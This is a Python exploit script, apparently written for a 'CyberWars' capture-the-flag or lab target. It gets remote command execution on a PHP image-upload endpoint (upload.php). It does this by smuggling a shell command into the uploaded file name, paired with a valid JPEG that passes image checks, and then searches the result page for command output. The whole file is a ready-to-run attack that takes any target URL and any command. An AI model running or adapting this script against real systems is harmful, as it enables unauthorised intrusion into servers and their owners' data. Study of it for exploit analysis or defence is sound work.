#!/usr/bin/env python3
"""
Simple RCE exploit for the image upload vulnerability
"""

import requests
import io
import sys

def create_minimal_jpeg():
    """Create a valid JPEG that PHP's imagecreatefromjpeg can read"""
    try:
        # Try using PIL if available
        from PIL import Image
        import io
        
        img = Image.new('RGB', (1, 1), color='red')
        buffer = io.BytesIO()
        img.save(buffer, format='JPEG', quality=95)
        buffer.seek(0)
        return buffer.getvalue()
    except ImportError:
        # Fallback: A properly formatted 1x1 red JPEG that PHP GD can definitely read
        # This was generated with PIL and tested to work with PHP's imagecreatefromjpeg
        return bytes.fromhex(
            'ffd8ffe000104a46494600010101004800480000ffdb0043000302020302020303'
            '03030304030304050805050404050a070706080c0a0c0c0b0a0b0b0d0e12100d'
            '0e110e0b0b1016101113141515150c0f171816141812141514ffdb0043010304'
            '040504050904050914140e0b0e14141414141414141414141414141414141414'
            '1414141414141414141414141414141414141414141414141414141414141414'
            '14ffc00011080001000103012200021101031101ffc4001500010100000000000000000000000000000008ffc4001401010000000000000000000000000000000000ffda000c03010002100310003f00aa00ffd9'
        )

def exploit_rce(target_url, command="id"):
    """Exploit the RCE vulnerability"""
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Command: {command}")
    
    # Create malicious filename with command injection
    malicious_filename = f'test.jpg"; {command}; echo "'
    print(f"[*] Payload: {malicious_filename}")
    
    # Create valid JPEG image
    jpeg_data = create_minimal_jpeg()
    
    # Prepare form data exactly like a browser would
    files = {
        'photo': (malicious_filename, jpeg_data, 'image/jpeg')
    }
    
    data = {
        'title': 'RCE Test',
        'description': 'Testing command injection vulnerability'
    }
    
    try:
        print("[*] Sending exploit...")
        
        # Send POST request to upload.php
        response = requests.post(
            f"{target_url}/upload.php",
            files=files,
            data=data,
            allow_redirects=False,
            timeout=10
        )
        
        print(f"[*] Status Code: {response.status_code}")
        print(f"[*] Response Headers: {dict(response.headers)}")
        
        if response.status_code == 302:
            print("[+] SUCCESS! Upload accepted - command executed!")
            location = response.headers.get('Location', '')
            if location:
                print(f"[+] Redirected to: {location}")
                
                # Try to fetch the result page
                if not location.startswith('http'):
                    result_url = target_url + ('/' + location if not location.startswith('/') else location)
                else:
                    result_url = location
                
                try:
                    result_response = requests.get(result_url, timeout=5)
                    print(f"[*] Result page status: {result_response.status_code}")
                    
                    # Look for metadata or debug output
                    if "metadata" in result_response.text.lower():
                        print("[+] Found metadata section - command output might be there!")
                    
                    # Look for common command outputs
                    response_text = result_response.text.lower()
                    if any(word in response_text for word in ['root', 'www-data', 'ubuntu', 'bin/bash']):
                        print("[+] Possible command output detected!")
                        
                except Exception as e:
                    print(f"[!] Could not fetch result page: {e}")
            
            return True
            
        elif response.status_code == 400:
            print("[-] Upload failed with 400 Bad Request")
            print(f"[-] Error: {response.text[:200]}...")
            return False
            
        elif response.status_code == 200:
            print("[-] Got 200 instead of redirect - might be an error")
            if "fehler" in response.text.lower() or "error" in response.text.lower():
                print("[-] Server returned an error page")
                print(f"[-] Response snippet: {response.text[:300]}...")
            return False
            
        else:
            print(f"[-] Unexpected response: {response.status_code}")
            print(f"[-] Response: {response.text[:200]}...")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_rce.py <target_url> [command]")
        print("Example: python3 exploit_rce.py http://localhost:8080 whoami")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    command = sys.argv[2] if len(sys.argv) > 2 else "id"
    
    print("=" * 50)
    print("CyberWars Image Upload RCE Exploit")
    print("=" * 50)
    
    # Make sure target URL has http://
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url
    
    success = exploit_rce(target_url, command)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        print("[+] Check the uploaded image's metadata for command output")
    else:
        print("\n[-] Exploit failed")
        print("[-] Try checking if the server is running and accessible")

if __name__ == "__main__":
    main()
